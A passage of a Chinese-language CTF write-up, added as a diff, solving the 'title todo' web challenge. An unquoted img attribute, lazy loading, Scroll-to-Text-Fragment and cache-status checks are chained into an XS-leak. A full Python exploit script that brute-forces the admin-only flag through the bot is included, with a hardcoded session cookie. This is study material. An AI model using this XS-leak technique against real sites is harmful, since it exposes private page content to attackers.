@@ -1,0 +1,105 @@
+然後這題真的很有趣而且很值得學習，三種解法都是完全不同的思路。
+
+喔對了，然後 maple3142 的 writeup 解決了我一個疑惑，那就是為什麼這一題的 template 都不會 escape，原來是因為 flask 預設只會 escape HTML/XML/XHTML，難怪我沒看到什麼設定。
+
+## title todo(6 solves)
+
+這題基本上就是個上傳圖片的網站，上傳完會拿到一個 url，接著可以給 title 跟 image url 新建一個 post。
+
+flag 則是用 admin 身份造訪時會放在網頁的最 footer，而且有著奇怪的格式：`LINECTF{([0-9a-f]/){10}}`
+
+然後在顯示圖片的網頁有個地方沒有用雙引號包住：
+
+``` html
+<img src={{ image.url }} class="mb-3">
+```
+
+雖然看起來是很小的一點，但其實整題的解法都是從這邊延伸出去的。從這邊不難看出我們可以控制 img 的任何屬性，不過我在這邊卡了頗久，想說可以控制又怎樣，沒辦法跳離 img 就不能 XSS。
+
+然後經過隊友提醒才想到 [STTF](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/) 的 xsleak，透過 img 的 lazy loading 來偵測是否有 scroll 的行為，所以只要 title 用很長，把 img 推下去，再加上 `loading=lazy` 的屬性，就可以搭配 STTF 來 leak 一個 byte。
+
+不過這題還有一點要注意，就是 CSP：
+
+```
+default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' blob:
+```
+
+CSP 繞不開，所以就算 `src` 可控，也沒辦法設置外面的圖片。因此這題加上了另一個機制：cache，可以根據 response header 來決定一個圖片的 cache 是 miss 還是 hit，所以我們只要上傳一張新的圖片丟給 bot，過幾秒再去看他的 response header，如果是 hit 就代表 bot 有訪問圖片，代表 SSTF 有成功。
+
+照著這個概念寫一個 exploit 就好：
+
+``` py
+import requests
+import json
+import time
+from time import sleep
+
+base_url = 'http://35.187.204.223'
+cookie = "session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"
+
+def upload_image():
+  files = {'img_file': open('a.png','rb')}
+
+  resp = requests.post(base_url + '/image/upload', files=files, headers={
+    "Cookie": cookie
+  })
+  return json.loads(resp.text)
+
+def create_post(url):
+  resp = requests.post(base_url + '/image', data={
+    "title": str(time.time()) + "w"*5000,
+    "img_url": f"/static/image/111 srcset={url} loading=lazy "
+  }, headers={
+    "Cookie": cookie
+  }, allow_redirects=False)
+  return resp.headers["X-ImageId"]
+
+def share(url, keyword):
+  resp = requests.post(base_url + '/share', json={
+    "path": "image/" + url + "#:~:text=" + keyword,
+  }, headers={
+    "Cookie": cookie
+  })
+  return resp.text
+
+def check_cached(img_url):
+  resp = requests.get(base_url + img_url, headers={
+    "Cookie": cookie
+  }, allow_redirects=False)
+  return resp.headers["X-Cache-Status"]
+
+def run():
+  known = "LINECTF{"
+  while True:
+    for char in "0123456789abcdef":
+      print("trying:" + known+char)
+
+      resp = upload_image()
+      img_url = resp["img_url"]
+      print("img url:" + img_url)
+
+      img_id = create_post(img_url)
+      print("img id:" + img_id)
+
+      share_res = share(img_id, known + char)
+      print("resp:" + share_res)
+
+      sleep(3)
+      cache_resp = check_cached(img_url)
+      print("cached:" + cache_resp)
+      if cache_resp == "HIT":
+        known += char + "/"
+        print(known)
+        break
+
+
+run()
+```
+
+另外，maple3142 的 writeup 又解決了我一個疑惑，那就是為什麼 flag 要有那些 `/`？原來是因為 Chromium 為了避免這種 xsleak，所以在判斷 SSTF 的時候一定要匹配到整個單字才會 scroll。
+
+舉例來說，如果頁面上有這串字：`Hello world`，你 text fragment 指定 `He`，是不會理你的，要 `Hello` 才會，這也是為什麼這題要用 `/` 來分割，因為沒分割的話就沒辦法一個字一個字來 leak。
+
+## me7-ball(2 solves)
+
+這題看起來好像跟 crypto 比較有關就沒仔細看了，直接貼 Super HexaGoN 的 writeup：https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682
